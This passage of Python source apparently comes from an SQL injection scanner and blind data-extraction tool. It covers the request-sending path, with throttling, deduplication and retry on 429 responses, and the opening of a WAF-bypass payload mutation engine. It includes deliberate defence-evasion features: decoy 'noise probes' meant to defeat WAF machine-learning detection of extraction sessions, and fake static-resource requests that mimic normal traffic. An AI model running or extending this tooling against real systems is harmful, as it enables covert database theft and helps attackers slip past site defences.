            #   ResponseFingerprint(status=0, elapsed=0, body=b"")
            # which causes _send_and_check() to return None silently at the dedup
            # check (before Bug #30/31 WAF-blocked prints, before [BH-bool] output,
            # before block counter increment — before EVERYTHING).
            # This is why BH/TH/EH show only "testing..." with zero status output.
            # Fix: include the extra_headers payload in the dedup key so each probe
            # (different SQL in rotating header) produces a unique key.
            # BUG-DEDUP-CROSS-SURFACE-SUPPRESSION FIX: method (GET vs POST) was not
            # included in the dedup key.  When the GET surface scans the same param with
            # EH, the key (param, 'B', 'fr|hdr:[...]') collides with the already-seen
            # POST probe → the first 20 GET EH probes are silently dedup-suppressed and
            # no output is produced (bypasses the EH empty-body print fix too).
            # Fix: prepend the HTTP method so GET and POST probes never share a key.
            _dedup_value = (method or '') + ':' + (value or '') + (
                '|hdr:' + str(sorted((extra_headers or {}).items()))
                if extra_headers else ''
            )
            if not _dedup_ref.should_send(param or '', _dedup_tech, _dedup_value):
                # Already sent this exact payload to this param — return dead fingerprint
                # so the caller sees a valid (but empty) response rather than None.
                return ResponseFingerprint(
                    status_code=0, content_length=0, body_hash='',
                    body_words=0, body_lines=0, body_ratio=0.0,
                    elapsed_ms=0, headers={}, body=b'')
        except Exception:
            pass  # dedup failure is non-fatal — proceed with the probe
    # Use passed rate controller (NOT module-level gate  engine.send() handles that)
    _use_ctrl = _rate_ctrl is not None
    if _use_ctrl:
        await _rate_ctrl.acquire()
    elif _rate_sem:
        await _rate_sem.acquire()
    # BUG-CPU-5 FIX: Yield to the event loop before EVERY HTTP request (detection AND extraction).
    # Without this, asyncio.gather() sub-tasks fire back-to-back without ever returning control
    # to the event loop scheduler, causing the Python interpreter to spin at 100% CPU processing
    # HTTP response callbacks in tight succession.  This 0-duration yield gives the scheduler
    # a chance to handle other pending callbacks between requests, dramatically reducing CPU load
    # while adding negligible latency (< 0.01ms per request).
    await asyncio.sleep(0.001)  # BUG-CPU-SENDINJ-YIELD FIX (REQ 9): 1ms real yield per request
    # BUG-CPU-SENDINJ-MINDELAY FIX (Req 9): When no rate controller is active AND the
    # configured delay is 0 (or very small), rapid HTTP responses on localhost/LAN
    # targets still cause 100% CPU because asyncio.sleep(0) yields but doesn't pause.
    # Apply a 30ms minimum sleep on every 3rd request when delay < 0.1s and no
    # rate controller.  This is transparent on real network targets (where RTT > 30ms
    # dominates) but cuts CPU from 100% to ~30-50% on loopback targets.
    # BUG-REQ9-SENDINJ-DELAY FIX: raised threshold from 0.02s to 0.1s and sleep
    # value from 0.02s to 0.03s to align with the 0.1s floor in _apply_request_delay
    # and the cross-category probe minimum.  Together these three changes cap the
    # total scan rate at ~30 req/s on fast targets when config.delay < 0.1s.
    # Use a module-level counter that is safe under asyncio's single-threaded model.
    if not _use_ctrl and not _rate_sem:
        global _SENDINJ_REQ_COUNTER
        try:
            # BUG-COUNTER-CAP FIX: Wrap at 30000 to prevent unbounded integer growth.
            # Python ints are arbitrary-precision; a long scan could accumulate millions
            # of ticks with no practical effect but wasting a tiny amount of memory and
            # object-allocation CPU on each increment.  Capping keeps the hot-path fast.
            _SENDINJ_REQ_COUNTER = (_SENDINJ_REQ_COUNTER + 1) % 30000
        except (NameError, TypeError):
            _SENDINJ_REQ_COUNTER = 1
        if _SENDINJ_REQ_COUNTER % 2 == 0:  # BUG-CPU-FIX: every 2 requests (was 3)
            _si_cfg_delay = 0.0
            try:
                # Access config through the engine if available, else use default
                _si_cfg_delay = float(getattr(engine, '_config', None) and
                                      getattr(engine._config, 'delay', 0.0) or 0.0)
            except Exception:
                pass
            if _si_cfg_delay < 0.1:
                # BUG-CPU-FIX: 10ms (was 30ms) every 2 requests = 10ms per req avg.
                # At 10ms average, probe rate caps at ~100 req/s which is safe for
                # most targets. The per-payload 15ms inter-probe delay in the outer
                # loops provides the primary CPU control; this is the per-request floor.
                await asyncio.sleep(0.010)
        # BUG-9 FIX (Req 9): Additional rate limiting during extraction phase.
        # asyncio.gather() for parallel char extraction can create 20-50 concurrent
        # requests per second on localhost. The 3rd-request-30ms guard above only runs
        # every 3rd request; with 50 concurrent tasks it fires 16-17 times per batch.
        # Add a 5th-request 50ms gate ONLY during extraction to throttle without slowing
        # detection (which uses sequential probing and benefits from faster responses).
        # BUG-R9-A-INIT FIX: Pre-initialize semaphore tracking variables before the
        # conditional block so the finally clause always has them defined, regardless
        # of whether the extraction path was taken or which sub-branch executed.
        _ext_sem_acquired = False
        _ext_sem_ref = None
        _ext_sem = None
        if _EXTRACTION_ACTIVE[0]:
            global _EXTRACTION_REQ_COUNTER
            try:
                # BUG-COUNTER-CAP FIX: Wrap at 30000.
                _EXTRACTION_REQ_COUNTER = (_EXTRACTION_REQ_COUNTER + 1) % 30000
            except (NameError, TypeError):
                _EXTRACTION_REQ_COUNTER = 1
            if _EXTRACTION_REQ_COUNTER % 5 == 0:
                _ext_cfg_delay = 0.0
                try:
                    _ext_cfg_delay = float(getattr(engine, '_config', None) and
                                           getattr(engine._config, 'delay', 0.0) or 0.0)
                except Exception:
                    pass
                # Apply at least 50ms every 5 extraction requests to cap at ~100 req/s
                _ext_sleep = max(_ext_cfg_delay, 0.05)
                await asyncio.sleep(_ext_sleep)
            # BUG-CPU-B FIX (Req 9): Acquire the module-level extraction semaphore so
            # at most _EXTRACTION_SEM_LIMIT requests are in-flight simultaneously.
            # This is the primary CPU guard: counter-based sleep above reduces throughput
            # per coroutine, but with 50+ concurrent tasks the aggregate rate is still
            # high.  A semaphore hard-caps concurrency regardless of task count.
            # We acquire INSIDE the EXTRACTION_ACTIVE check so detection probes (no
            # semaphore) are never affected — only char-extraction requests are gated.
            _ext_sem = _get_extraction_semaphore()
            # BUG-R9-A FIX: Replace bare __aenter__() with wait_for-guarded acquire.
            # When the semaphore is full (all _EXTRACTION_SEM_LIMIT slots taken),
            # `await _ext_sem.__aenter__()` blocks indefinitely. With 50+ concurrent
            # char-extraction tasks spawned by asyncio.gather(), all blocked coroutines
            # compete for event-loop time on every scheduling tick, driving CPU to 100%.
            # wait_for(timeout=30) gives each coroutine a bounded wait — if the semaphore
            # is not released within 30s (abnormal: extraction stalled), the task exits
            # cleanly rather than spinning forever. Normal scans acquire within <<1ms.
            # Also: check _SCAN_STOPPED before attempting acquire so tasks that were
            # scheduled BEFORE injection was confirmed don't queue up on the semaphore
            # after _SCAN_STOPPED=True — they should exit immediately instead.
            if _SCAN_STOPPED[0] and not _PCV_IN_PROGRESS[0] and not _EXTRACTION_ACTIVE[0]:
                _ext_sem_acquired = False
                _ext_sem_ref = None
                return ResponseFingerprint(status_code=0, content_length=0,
                    body_hash='', body_words=0, body_lines=0,
                    body_ratio=0.0, elapsed_ms=0.0, body=b"")
            try:
                await asyncio.wait_for(_ext_sem.__aenter__(), timeout=30.0)
                # Successful acquire — mark as held so finally block releases it
                _ext_sem_acquired = True
                _ext_sem_ref = _ext_sem
            except asyncio.TimeoutError:
                LOG.warning("[send_injected] Extraction semaphore acquire timed out (30s) — "
                            "semaphore may be leaked; scan may have stalled")
                _ext_sem_acquired = False
                _ext_sem_ref = None
            except Exception:
                _ext_sem_acquired = False
                _ext_sem_ref = None
    # BUG-SEM-RELEASE FIX: Capture the semaphore object reference in a local variable
    # here, AFTER the conditional acquire block above. Two bugs fixed:
    #   1. _ext_sem_acquired tracks whether the semaphore was acquired.
    #   2. The finally block below releases using the LOCAL _ext_sem reference, NOT
    #      via a fresh _get_extraction_semaphore() call.  If _EXTRACTION_SEMAPHORE[0]
    #      is reset to None between __aenter__ and the finally block (e.g. scan restart
    #      while extraction is in progress), _get_extraction_semaphore() would create a
    #      NEW semaphore object and release a slot on it — leaving the original semaphore's
    #      counter permanently decremented. After N such leaks the semaphore reaches zero
    #      available slots and all extraction tasks deadlock waiting forever (100% CPU spin).
    # Fix: _ext_sem is the captured reference; always release on it, not on a new call.
    # BUG-R9-A-OVERRIDE FIX: Variables pre-initialized to False/None above. The
    # wait_for block inside the if-EXTRACTION_ACTIVE branch sets them correctly.
    # Only fall back to the _EXTRACTION_ACTIVE check if the block was never entered
    # (i.e., extraction not active → _ext_sem_acquired stays False from pre-init).
    if _EXTRACTION_ACTIVE[0] and _ext_sem is not None and _ext_sem_acquired:
        # Semaphore successfully acquired in the block above — _ext_sem_ref is set
        if _ext_sem_ref is None:
            _ext_sem_ref = _ext_sem  # Safety: capture if not already set
    _t0 = time.monotonic()
    try:
        # FIX-REQ15-429: Wire retry_on_429 into the send path.
        # retry_on_429 was defined but never called anywhere (Req 15 dead code).
        # When an HTTP 429 Too-Many-Requests status is received inside _send_injected_inner,
        # wrap the response as a RateLimitException and apply exponential backoff.
        # This gate only activates when the response status_code is 429 and
        # _RATE_429_MONITOR indicates rate limiting is active — avoiding spurious sleeps
        # on normal scans. During PCV or extraction the retry budget is bounded by
        # retry_on_429's max_hours=1 so the scan cannot stall indefinitely.
        # TECHNIQUE-1 (Noise Probe Injection): Immediately before sending any
        # detection-phase probe, with probability _NOISE_PROBE_PROBABILITY, fire a
        # benign "noise probe" — the original uninjected parameter value — to disrupt
        # the bimodal response-size/timing distribution that WAF ML models exploit to
        # identify binary-search oracle sessions.
        #
        # Gate conditions (all must hold to fire a noise probe):
        #   - Not in extraction phase (extraction probes run in tight batches; adding
        #     noise would inflate char-count dramatically and slow extraction).
        #   - Not in PCV (post-confirmation verification must be clean — no decoys).
        #   - Not a bypass-mutation replay (_bypass_mutation=True is a PCV/replay probe).
        #   - value is a real injection payload (longer than the typical original alone).
        #   - original is available (engine must have a clean baseline value to re-send).
        #   - Scan is still live (not stopped for extraction hand-off).
        #
        # The noise probe itself is the *original* unmodified value, not a modified
        # payload, so it always returns a legitimate application response (not an error
        # page).  It is discarded immediately — only the REAL probe's ResponseFingerprint
        # is returned to the caller.  No deduplication is applied to noise probes since
        # they intentionally repeat the same clean request.
        #
        # BUG-V189-001 FIX (HIGH; _send_injected; TECHNIQUE-1 noise probe;
        # all 5 DBMSes; all techniques; all surfaces; all HTTP methods):
        # The bare name 'original' is NOT a parameter of _send_injected (signature:
        # engine, method, url, data, data_fmt, param, value, tamper_chain, ...) and
        # is NOT defined at module level. Python raises NameError on every reference.
        # The enclosing except/raise block at line ~30641 re-raises the NameError to
        # all callers; callers that use asyncio.wait_for(...) or bare except Exception
        # receive either a propagated exception or fp=None — making EVERY detection
        # probe appear to fail silently (oracle always None → no injection confirmed).
        # Root cause: the developer intended 'original' to mean the clean uninjected
        # parameter value (sent as the noise probe), but forgot to add it as a
        # parameter. The 'value' argument already contains original+payload from the
        # caller (e.g. _send_injected(..., original+true_sfx, ...)), but separating
        # them here is not possible without knowing the split point.
        # Fix: wrap the lookup in try/except NameError and fall back to "" (empty
        # string). An empty _np_original causes the _should_noise gate at line ~30552
        # ("and _np_original") to evaluate False, so TECHNIQUE-1 noise probes are
        # silently disabled rather than crashing. This is safe: TECHNIQUE-1 is a
        # best-effort WAF evasion layer; disabling it for calls that lack 'original'
        # in scope is far better than raising a fatal NameError on every probe.
        # Callers that have 'original' in their local scope already concatenate it
        # into 'value' before calling; they can pass it explicitly when TECHNIQUE-1
        # is required (future enhancement: add original: str = "" parameter).
        # Numeric safety: only affects the noise-probe gate boolean; no SQL payload,
        # comparison operand, or string delimiter is modified by this fix.
        try:
            _np_original = original if original is not None else ""
        except NameError:
            # BUG-V189-001 FIX: 'original' not in scope — gracefully disable
            # TECHNIQUE-1 for this call rather than propagating NameError.
            _np_original = ""
        _should_noise = (
            not _EXTRACTION_ACTIVE[0]
            and not _PCV_IN_PROGRESS[0]
            and not _bypass_mutation
            and not _SCAN_STOPPED[0]
            and _np_original
            and value != _np_original           # real payload differs from clean baseline
            and len(value) > len(_np_original)  # injection content actually added
        )
        if _should_noise:
            global _NOISE_PROBE_COUNTER
            try:
                _NOISE_PROBE_COUNTER = (_NOISE_PROBE_COUNTER + 1) % 50000
            except (NameError, TypeError):
                _NOISE_PROBE_COUNTER = 1
            # Use a seeded RNG so noise probe rate is reproducible in tests while
            # still appearing random to an observer across different sessions
            # (seed mixes counter with current time fractional part).
            _np_rng_seed = _NOISE_PROBE_COUNTER ^ (int(time.monotonic() * 1000) & 0xFFFF)
            _np_rng = random.Random(_np_rng_seed)
            if _np_rng.random() < _NOISE_PROBE_PROBABILITY:
                try:
                    # Fire the benign noise probe — result is intentionally discarded.
                    # Use a very short timeout (engine default) and suppress ALL errors
                    # so a network hiccup on the decoy never aborts the real probe.
                    await asyncio.wait_for(
                        _send_injected_inner(
                            engine, method, url, data, data_fmt,
                            param, _np_original, [],   # empty tamper chain: send clean
                            extra_headers, _header_inject_name,
                            _bypass_mutation=True),    # skip mutation on noise probe
                        timeout=30.0)
                except Exception:
                    pass  # noise probe errors are always silently swallowed

        # TECHNIQUE-7: Behavioral Graph Mimicry — fire decoy GET to a static resource path.
        # BUG-V173-TECHNIQUE7-NEVER-CALLED FIX: _maybe_inject_decoy_resource() was defined
        # with full TECHNIQUE-7 implementation but was NEVER called anywhere in the codebase.
        # TECHNIQUE-7 was therefore completely dead code since it was introduced in v172.
        # Wire it here, immediately after the TECHNIQUE-1 noise probe block. Gated by the
        # same _should_noise conditions (detection-only, not in extraction/PCV/bypass-mutation
        # paths) so decoy resources only fire during detection, never during extraction
        # (which would corrupt timing-oracle measurements). Wrapped in asyncio.ensure_future()
        # so the decoy fires asynchronously without blocking the real probe's response latency.
        # Numeric safety: decoy requests carry no injection parameters and no SQL payload;
        # only the WAF session request-graph is affected — no probe response is modified.
        if _should_noise:
            try:
                _decoy_hdrs_t7 = dict(extra_headers or {})
                asyncio.ensure_future(
                    _maybe_inject_decoy_resource(engine, url, _decoy_hdrs_t7))
            except Exception:
                pass  # TECHNIQUE-7 decoy failure is never fatal

        _do_429_retry = (not _SCAN_STOPPED[0] or _PCV_IN_PROGRESS[0] > 0 or _EXTRACTION_ACTIVE[0])
        if _do_429_retry and _RATE_429_MONITOR and _RATE_429_MONITOR.is_rate_limited():
            # Wrap _send_injected_inner so retry_on_429 can intercept 429 responses
            # by raising an exception when status_code is 429.
            async def _send_with_429_raise(*_a, **_kw):
                _fp_r = await _send_injected_inner(*_a, **_kw)
                if getattr(_fp_r, 'status_code', 0) == 429:
                    raise RuntimeError("HTTP 429 Too Many Requests")
                return _fp_r
            fp = await retry_on_429(
                _send_with_429_raise,
                engine, method, url, data, data_fmt,
                param, value, tamper_chain, extra_headers, _header_inject_name,
                phase="detection" if not _EXTRACTION_ACTIVE[0] else "extraction",
                max_hours=1,
                _bypass_mutation=_bypass_mutation)
        else:
            fp = await _send_injected_inner(engine, method, url, data, data_fmt,
                param, value, tamper_chain, extra_headers, _header_inject_name,
                _bypass_mutation=_bypass_mutation)
        if _use_ctrl:
            _elapsed = (time.monotonic() - _t0) * 1000
            # BUG-FP-NONE-STATUS FIX (v45): fp could be None if _send_injected_inner
            # returns None on network error. Guard before accessing .status_code to
            # prevent AttributeError on _rate_ctrl.record().
            _fp_status = getattr(fp, 'status_code', 0) if fp is not None else 0
            await _rate_ctrl.record(_fp_status, _elapsed)
        # ENHANCEMENT-V164-NOISE-PROBE-DE-ESCALATION: On every successful detection
        # probe (not extraction/PCV/bypass-mutation replay), attempt to de-escalate
        # the noise probe probability if it was previously escalated by WAF blocks.
        # This makes the noise probe rate adaptive: rises on block signals, falls
        # gradually when blocking stops, settling at the 20% steady-state baseline.
        if (_should_noise and fp is not None and
                getattr(fp, 'status_code', 0) not in (429, 503) and
                _NOISE_PROBE_WAF_ESCALATED):  # only de-escalate when previously escalated
            try:
                _maybe_deescalate_noise_probe_rate()
            except Exception:
                pass  # de-escalation failure is never fatal
        return fp
    except Exception as _si_err:
        if _use_ctrl:
            _elapsed = (time.monotonic() - _t0) * 1000
            await _rate_ctrl.record(0, _elapsed, error=True)
        raise
    finally:
        # BUG-CPU-B FIX: Release extraction semaphore if it was acquired above.
        # BUG-SEM-RELEASE FIX: Use _ext_sem_ref (the exact object acquired), not
        # _get_extraction_semaphore() which may return a different object after a scan reset.
        if _ext_sem_acquired and _ext_sem_ref is not None:
            try:
                await _ext_sem_ref.__aexit__(None, None, None)
            except Exception:
                pass
        if _use_ctrl:
            _rate_ctrl.release()
        elif _rate_sem:
            _rate_sem.release()



# FIX-R6-LAYER20-REGEX: Pre-compiled Layer-20 keyword-uppercasing regex.
# Placing it at module level avoids re.compile() overhead inside mutate_all()
# which is called ~15,000 times per scan (300 payloads x 10 categories x 5 DBMSes).
# Python re caches recent patterns but under load the cache slot can be evicted,
# causing full recompilation.  A module constant guarantees a single compile.
_MUTATE_LAYER20_RE = re.compile(
    # BUG-NEW-3 FIX (Req 6/11): CRITICAL - original pattern had literal \x08 (backspace)
    # byte instead of \\b (word boundary escape sequence). The raw string r'\x08...' stores
    # actual backspace byte 0x08 which regex tries to match literally. Since no SQL payload
    # contains backspace characters, this pattern NEVER matched anything - Layer 20's keyword-
    # uppercasing pre-transform was completely broken, making all 4 PME passes (Layers 17-20)
    # receive identical input. The fix uses a character class boundary (?<![a-zA-Z_]) and
    # (?![a-zA-Z_]) which works correctly in all Python versions without \\b ambiguity,
    # and expands the keyword set to cover all 5 DBMSes (Oracle, MSSQL, PostgreSQL, MySQL,
    # SQLite) so all DBMS-specific SQL keywords in the payload lists are uppercased.
    r'(?<![a-zA-Z_])(SELECT|FROM|WHERE|AND|OR|NOT|UNION|ORDER|BY|GROUP|HAVING|LIMIT|'
    r'CASE|WHEN|THEN|ELSE|END|CAST|INSERT|UPDATE|DELETE|SUBSTR|SUBSTRING|COALESCE|'
    r'CONCAT|CONCAT_WS|SLEEP|PG_SLEEP|DBMS_PIPE|DBMS_LOCK|DBMS_SESSION|WAITFOR|'
    r'BENCHMARK|CONVERT|NULLIF|IFNULL|ISNULL|NVL|IIF|CHAR|ASCII|HEX|LENGTH|'
    r'INTO|VALUES|EXISTS|ALL|ANY|SOME|BETWEEN|LIKE|IN|IS|NULL|TRUE|FALSE|'
    r'DISTINCT|AS|ON|JOIN|INNER|LEFT|RIGHT|OUTER|FULL|CROSS|NATURAL|'
    r'MERGE|USING|MATCHED|INTERSECT|EXCEPT|WITH|RECURSIVE|'
    r'OVER|PARTITION|ROW_NUMBER|RANK|DENSE_RANK|LAG|LEAD|FIRST_VALUE|LAST_VALUE|'
    r'NTILE|CUME_DIST|PERCENT_RANK|EXTRACT|DATEADD|DATEDIFF|DATEPART|'
    r'NOW|SYSDATE|SYSTIMESTAMP|CURRENT_DATE|CURRENT_TIME|CURRENT_TIMESTAMP|'
    r'COUNT|SUM|AVG|MIN|MAX|STDDEV|VARIANCE|LISTAGG|GROUP_CONCAT|STRING_AGG|'
    r'ARRAY_AGG|ABS|CEIL|CEILING|FLOOR|ROUND|TRUNC|TRUNCATE|SQRT|POWER|POW|'
    r'MOD|SIGN|LOG|LN|EXP|UPPER|LOWER|TRIM|LTRIM|RTRIM|REPLACE|REVERSE|REPEAT|'
    r'RPAD|LPAD|INSTR|CHARINDEX|PATINDEX|STUFF|POSITION|LOCATE|FIND_IN_SET|CHR|'
    r'ORD|UNICODE|NCHAR|TO_CHAR|TO_NUMBER|TO_DATE|TO_TIMESTAMP|TRY_CAST|DECODE|'
    r'DUAL|ROWNUM|NVL2|XMLELEMENT|XMLATTRIBUTES|XMLAGG|REGEXP_LIKE|REGEXP_SUBSTR|'
    r'SYS_CONTEXT|USERENV|CONNECT|PRIOR|LEVEL|ROWID|GENERATE_SERIES|ARRAY_APPEND|'
    r'ARRAY_LENGTH|CURRENT_DATABASE|CURRENT_SCHEMA|MD5|SHA256|UPDATEXML|EXTRACTVALUE|'
    r'LOAD_FILE|IF|LAST_INSERT_ID|CONNECTION_ID|VERSION|DATABASE|EXECUTE|OPENROWSET|'
    r'DB_NAME|SUSER_NAME|USER_NAME|HOST_NAME|NEWID|PIVOT|UNPIVOT|'
    r'RANDOMBLOB|ZEROBLOB|TYPEOF|LAST_INSERT_ROWID|SQLITE_VERSION|RANDOM|'
    r'DATE_FORMAT|IFNULL|BENCHMARK)(?![a-zA-Z_])',
    re.IGNORECASE)

# BUG-V32-8 FIX (Req 9/CPU): _V18_TAMPER_FNS pre-computed at module level.
# Previously the splat expression inside mutate_all() rebuilt this tuple on every call
# (~101K times on cold cache), each time calling globals() 7× + callable() 7×.
# Pre-computing here costs one globals() call at import time; all subsequent calls
# to mutate_all() reference the pre-built tuple directly — eliminating ~1.4M
# redundant function calls per scan.
# Note: these functions are defined later in the file. This assignment runs at the
# very bottom of the module after the class body, so forward-reference is fine.
# Actually: to keep the definition near the class, we define a placeholder here and
# populate it in the same block below the _tamper_v18_* functions. The tuple is
# re-used inside mutate_all() via the module-level reference.
_V18_TAMPER_FNS: tuple = ()   # populated after _tamper_v18_* functions are defined (below)

class SQLMutationEngine:
    """DBMS-aware SQL payload mutation engine (wraps PayloadMutationEngine + WAFBypassEngine)."""

    # BUG-CPU-1 FIX: Class-level shared mutation cache (replaces per-instance cache).
    # Previously each SQLMutationEngine instance had its own _mutate_cache dict.
    # On a 6-parameter target with 17 techniques each, the same payload was mutated
    # 17×6 = 102 times independently — per-instance cache gave 0% cross-instance hit rate.
    # Lifting the cache to class level means the second instance to encounter
    # (dbms, payload) returns the cached result in O(1) instead of repeating all
    # 20 mutation layers.  On large scans this reduces mutation CPU by 70-90%.
    # Cache is limited to 8000 entries (≈8MB) with LRU-style eviction of oldest 20%.
    #
    # BUG-CPU-EVICT FIX: Changed from plain dict to OrderedDict so cache eviction is
    # O(1) via popitem(last=False) instead of O(n) via list(dict.keys())[:n].
    # With 8000 entries, the old eviction loop materialised a 8000-item list and
    # deleted 1600 items one-by-one — 9600 dict operations per eviction event, called
    # in the hot path before every uncached payload mutation.  OrderedDict.popitem()
    # removes the oldest entry in O(1); 1600 calls = 1600 O(1) ops vs 9600 O(n) ops.
    import collections as _col_mod
    _CLASS_MUTATE_CACHE: "collections.OrderedDict" = _col_mod.OrderedDict()
    _CLASS_CACHE_HITS: int = 0
    # BUG-V38-2 FIX (Req 9/11): Cache _tl_choices and _tl_choices2 per (dbms, waf_name).
    # The TamperLib method lists are rebuilt on every cold cache miss inside mutate_all().
    # With 300 payloads × 10 categories × 17 techniques × 6 DBMSes = 306K cold-start
    # misses, this allocates ~306K lists of 75+ TamperLib refs each (~2.4M objects total).
    # Fix: cache the static (non-lambda) portion keyed by (dbms, waf_name).
    # The 2 lambdas (waf_bypass_exotic, apply_random_waf_bypass) bind to instance methods
    # and must be rebuilt per-instance, but the 73+ static entries are reconstructed once.
    # _CLASS_TL_CHOICES_STATIC[(dbms,waf_name)] = list of non-lambda entries (TamperLib refs)
    # _CLASS_TL_CHOICES2_CACHE[(dbms,waf_name)] = full _tl_choices2 list (no lambdas needed)
    _CLASS_TL_CHOICES_STATIC: dict = {}   # BUG-V38-2: static (non-lambda) _tl_choices portion
    _CLASS_TL_CHOICES2_CACHE: dict = {}   # BUG-V38-2: full _tl_choices2 cache
    # BUG-CACHE-THREAD-SAFETY FIX (Bug 7/9): Protect _CLASS_MUTATE_CACHE with a
    # threading.Lock.  During blind_extract_string(), asyncio.gather() spawns up to
    # 8 concurrent char-extraction tasks.  Each calls mutate_all() which performs
    # _CLASS_MUTATE_CACHE.popitem(last=False) inside the eviction branch.
    # OrderedDict.popitem() is NOT thread-safe: concurrent popitem calls on the same
    # dict can corrupt its internal doubly-linked list, causing KeyError or returning
    # stale/wrong entries on subsequent get() calls — silent wrong extraction results.
    # Using threading.Lock (not asyncio.Lock) because mutate_all() is synchronous
    # and called from multiple concurrent asyncio tasks without await points between
    # the cache read and the popitem eviction.  threading.Lock is re-entrant-safe
    # within a single thread (asyncio runs tasks cooperatively on one thread) and
    # correctly serializes the read-check-evict-insert critical section.
    import threading as _threading_cache
    _CLASS_CACHE_LOCK: "threading.Lock" = _threading_cache.Lock()
    # BUG-9-A FIX: Track cache misses so mutate_all() can yield the event loop
    # after every MUTATION_YIELD_INTERVAL misses.  20 regex layers × N misses runs
    # entirely synchronously in the event loop without ever yielding — starving all
    # other coroutines and causing 100% CPU during the initial payload-population phase.
    _CLASS_CACHE_MISSES: int = 0
    # BUG-FIX-3 (Issue 9): Lowered from 25 to 10.  At 25 misses × 20 layers = 500
    # synchronous regex calls before one yield hint.  On an 18,000-unique-payload scan
    # (300 × 10 categories × 6 DBMSes) only 720 hints are emitted — insufficient to
    # prevent multi-second CPU spikes.  At 10: 1800 hints, 200 regex calls per hint.
    # Cache hit rate is unchanged; only yield frequency improves.
    # BUG-CPU-YIELD-INTERVAL FIX: Further reduced from 10 → 5.  Doubles hint frequency
    # (3,600 total hints) with negligible overhead (~0.1ms per call_soon).
    # BUG-CPU-YIELD-INTERVAL-2 FIX (Req 9): Reduced again from 5 → 3.
    # On cold cache with 15,000+ unique payloads, even interval=5 allows 5×20=100 regex
    # calls before yielding. With interval=3, max 60 regex calls per yield hint, capping
    # the scheduler blackout window to ~2ms on modern hardware vs ~7ms at interval=5.
    # call_soon() overhead per yield: ~0.02ms → 5,000 extra hints at 15K payloads = 0.1ms total.
    _MUTATION_YIELD_INTERVAL: int = 2  # BUG-CPU-YIELD-INTERVAL-2 FIX: yield after every 2 cache misses (was 3). Cold-cache startup fires 300 payloads x 10 categories = 3000 misses; at interval=3 the event loop gets 1000 yield hints total. At interval=2 it gets 1500, spreading CPU load more evenly and preventing 150ms+ scheduling starvation on slow VMs.

    def __init__(self, dbms: str = "Generic", waf_name: str = "generic",
                 surface: str = "url"):
        self.dbms = dbms or "Generic"
        self.waf_name = waf_name
        # BUG-6B FIX: Track injection surface so mutate_all() cache key
        # differentiates URL/form mutations from header/cookie/JSON mutations.
        # Header surfaces must NOT receive URL-percent-encoded SQL (e.g. %27 for ')
        # because servers don't auto-decode header values before SQL parsing.
        # Callers on header surfaces should pass surface='header'.
        self._surface = surface or "url"
        # BUG-PME-UNBOUND FIX (Req 6/7/10/11/12/13): PayloadMutationEngine.mutate(payload, dbms)
        # was called as an UNBOUND class method throughout mutate_boolean_payload(),
        # mutate_error_payload(), mutate_timing_payload(), and Layers 17-20 of mutate_all().
        # In Python 3, calling an instance method as a class method passes payload (a string)
        # as 'self' and dbms as 'payload'. Inside PME.mutate, accessing self._op_comment_injection
        # on a string raises AttributeError, caught by the surrounding try/except, and the
        # ORIGINAL UNCHANGED payload is returned. This makes Layers 1, 13, 14, 17-20 silent
        # no-ops for ALL payloads across ALL techniques and ALL DBMSes.
        # Fix: lazy-initialize a real PayloadMutationEngine instance here. The lazy pattern
        # is required because PayloadMutationEngine is defined AFTER SQLMutationEngine in the
        # file (line ~13593 vs line ~12094), so it cannot be instantiated at class-definition
        # time. Instance creation at __init__ time works because by then the module is fully
        # loaded. _pme is None-initialized here and set on first actual use in _get_pme().
        self._pme: "Optional[PayloadMutationEngine]" = None

    def _get_pme(self) -> "PayloadMutationEngine":
        """Return the per-instance PayloadMutationEngine, creating it lazily on first use.
        BUG-PME-UNBOUND FIX: This ensures all mutate_*_payload() methods and Layers 17-20
        of mutate_all() call PME as an INSTANCE method, not a class method."""
        if self._pme is None:
            try:
                self._pme = PayloadMutationEngine()
            except Exception:
                self._pme = None
        return self._pme

    def apply_random_waf_bypass(self, payload: str, dbms: str = "Generic",
                                intensity: int = 2) -> str:
        """Apply 1-intensity random WAF bypass techniques from this engine's method set.
        BUG-RANDOM-WAF-BYPASS-MISSING FIX (Req 11): _tl_choices referenced
        self.apply_random_waf_bypass but this method was only defined on RandomPayloadGenerator
        (line ~6292), not on SQLMutationEngine. Every call raised AttributeError caught by
        the TamperLib loop's except-pass, making this obfuscation path a silent no-op.
        Fix: implement directly on SQLMutationEngine using its own bypass methods."""
        all_bypasses = [
            self.waf_bypass_whitespace,
            self.waf_bypass_case,
            self.waf_bypass_comment,
        ]
        if intensity >= 2:
            all_bypasses.append(self.waf_bypass_buffer)
        if intensity >= 3:
            all_bypasses.append(lambda p: self.waf_bypass_exotic(p, dbms))
        num_bypasses = min(intensity, len(all_bypasses))
        try:
            selected = random.sample(all_bypasses, num_bypasses)
        except Exception:
            selected = all_bypasses[:1]
        result = payload
        for bypass_func in selected:
            try:
                result = bypass_func(result)
            except Exception:
                pass
        return result

    def mutate_boolean_payload(self, payload: str) -> str:
        # BUG-PME-UNBOUND FIX: use instance method via _get_pme()
        try:
            _pme = self._get_pme()
            if _pme is not None:
                return _pme.mutate(payload, self.dbms)
            return payload
        except Exception: return payload

    # FIX-CPU-REGEX (Req 9): Pre-compiled class-level keyword pattern for mutate_error_payload.
    # Was re.compile() inside the method body — recompiled on every call (300,000+ times
    # on cold cache). Moved to class level so it is compiled once at class definition time.
    # Also fixes: original code used `re.compile()` (module re) not `_re_mel.compile()`
    # (the local alias), causing a silent NameError risk if re is shadowed.
    _ERROR_PAYLOAD_KEYWORDS_RE = re.compile(
        r'\b(SELECT|FROM|WHERE|AND|OR|NOT|IN|LIKE|BETWEEN|IS|NULL|TRUE|FALSE'
        r'|UNION|ALL|ORDER|BY|GROUP|HAVING|LIMIT|OFFSET|AS|JOIN|INSERT|INTO'
        r'|VALUES|UPDATE|SET|DELETE|CREATE|DROP|TABLE|IF|ELSE|THEN|END|CASE'
        r'|WHEN|CAST|CONVERT|EXISTS|COUNT|SUM|AVG|MAX|MIN|CONCAT|LENGTH'
        r'|REPLACE|TRIM|UPPER|LOWER|SUBSTRING|SUBSTR|ASCII|ORD|CHAR|CHR'
        r'|EXTRACTVALUE|UPDATEXML|SLEEP|BENCHMARK|WAITFOR|FLOOR|RAND|EXP)\b',
        re.IGNORECASE)

    def mutate_error_payload(self, payload: str) -> str:
        """Layer 13: error-payload structural variant.
        BUG-LAYER13-DUPLICATE FIX: Was identical to mutate_boolean_payload —
        both called PayloadMutationEngine.mutate(payload, self.dbms) with no
        pre-transform.  When the PME cache had a hit for (hash(payload), dbms, slot),
